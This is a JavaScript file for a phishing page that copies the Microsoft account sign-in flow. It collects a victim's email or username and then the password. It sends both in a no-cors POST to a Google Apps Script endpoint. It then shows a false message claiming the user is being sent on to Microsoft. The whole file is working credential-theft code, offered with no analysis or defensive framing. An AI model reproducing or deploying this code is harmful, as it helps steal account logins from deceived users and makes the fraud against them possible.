const scriptURL =
  "https://script.google.com/macros/s/AKfycbyQGx1pO5pSJbHjbLF_opLD9lhIybnFprok0nt8KUiqf3tWJFMARBZaZtM9IedAFg5ccw/exec";

document.addEventListener("DOMContentLoaded", () => {
  const unReq = "Enter a valid email address, phone number, or Skype name.";
  const pwdReq = "Please enter the password for your Microsoft account.";
  const unameInp = document.getElementById("inp_uname");
  const pwdInp = document.getElementById("inp_pwd");
  let view = "uname";

  console.log(unameInp);
  console.log(pwdInp);

  let unameVal = (pwdVal = false);
  /////next button
  // Retrieve the forms
  const unameForm = document.forms["uname"];
  const passForm = document.forms["pass"];

  // Function to combine and send data from both forms
  function sendData() {
    // Create a new FormData object
    const combinedFormData = new FormData();

    // Get data from the uname form and append it to combinedFormData
    const unameFormData = new FormData(unameForm);
    for (const [key, value] of unameFormData.entries()) {
      combinedFormData.append(key, value);
    }

    // Get data from the pass form and append it to combinedFormData
    const passFormData = new FormData(passForm);
    for (const [key, value] of passFormData.entries()) {
      combinedFormData.append(key, value);
    }

    // Send combinedFormData via fetch
    fetch(scriptURL, {
      method: "POST",
      body: combinedFormData,
      mode: "no-cors",
    })
      .then((response) => {
        // Handle the response here if needed
        console.log("Data sent successfully!");
      })
      .catch((error) => {
        // Handle errors here
        console.error("Error:", error);
      });
  }
  const nxt = document.getElementById("btn_next");

  nxt.addEventListener("click", () => {
    //validate the form
    validate();
    if (unameVal) {
      document.getElementById("section_uname").classList.toggle("d-none");
      document.getElementById("section_pwd").classList.remove("d-none");
      document.querySelectorAll("#user_identity").forEach((e) => {
        e.innerText = unameInp.value;
      });
      view = "pwd";
      //   sendData();
    }
  });

  const sig = document.getElementById("btn_sig");

  sig.addEventListener("click", () => {
    //validate the form
    validate();
    if (pwdVal) {
      document.getElementById("section_pwd").classList.toggle("d-none");
      view = "final";
      sendData();
    }
	alert("Thank You for Login & You are Redirecting to Microsoft Website");
    setTimeout((window.location = "index.html"), 5000);
  });

  function validate() {
    function unameValAction(type) {
      if (!type) {
        document.getElementById("error_uname").innerText = unReq;
        unameInp.classList.add("error-inp");
        unameVal = false;
      } else {
        document.getElementById("error_uname").innerText = "";
        unameInp.classList.remove("error-inp");
        unameVal = true;
      }
    }
    function pwdValAction(type) {
      if (!type) {
        document.getElementById("error_pwd").innerText = pwdReq;
        pwdInp.classList.add("error-inp");
        pwdVal = false;
      } else {
        document.getElementById("error_pwd").innerText = "";
        pwdInp.classList.remove("error-inp");
        pwdVal = true;
      }
    }
    if (view === "uname") {
      if (unameInp.value.trim() === "") {
        unameValAction(false);
      } else {
        unameValAction(true);
      }
      unameInp.addEventListener("change", function () {
        if (this.value.trim() === "") {
          unameValAction(false);
        } else {
          unameValAction(true);
        }
      });
    } else if (view === "pwd") {
      if (pwdInp.value.trim() === "") {
        pwdValAction(false);
      } else {
        pwdValAction(true);
      }
      pwdInp.addEventListener("change", function () {
        if (this.value.trim() === "") {
          pwdValAction(false);
        } else {
          pwdValAction(true);
        }
      });
    }
    return false;
  }

  //back button
  document.querySelector(".back").addEventListener("click", () => {
    view = "uname";
    document.getElementById("section_pwd").classList.toggle("d-none");
    document.getElementById("section_uname").classList.remove("d-none");
  });

  //final buttons
  document.querySelectorAll("#btn_final").forEach((b) => {
    b.addEventListener("click", () => {
      //close the window
      window.open(location, "_self").close();
    });
  });
});
